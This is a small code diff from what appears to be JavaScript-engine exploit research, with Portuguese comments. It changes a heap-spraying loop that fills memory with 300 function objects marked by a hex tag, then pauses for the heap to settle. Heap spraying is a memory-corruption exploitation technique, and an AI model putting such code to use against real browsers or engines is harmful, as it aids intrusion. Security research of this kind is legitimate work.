@@ -97,7 +97,7 @@ export async function sprayAndInvestigateObjectExposure() {
         logS3("PASSO 2: Pulverizando objetos JSFunction...", "info", FNAME_CURRENT_TEST);
         const NUM_SPRAY_FUNCTIONS = 300; // Aumentar o spray
         for (let i = 0; i < NUM_SPRAY_FUNCTIONS; i++) {
-            sprayedObjects.push(function() { return i + 0xFUNCSPR; });
+            sprayedObjects.push(function() { return i + 0xFAB0000; });
         }
         logS3(`  ${sprayedObjects.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
         await PAUSE_S3(500); // Dar tempo para a heap assentar
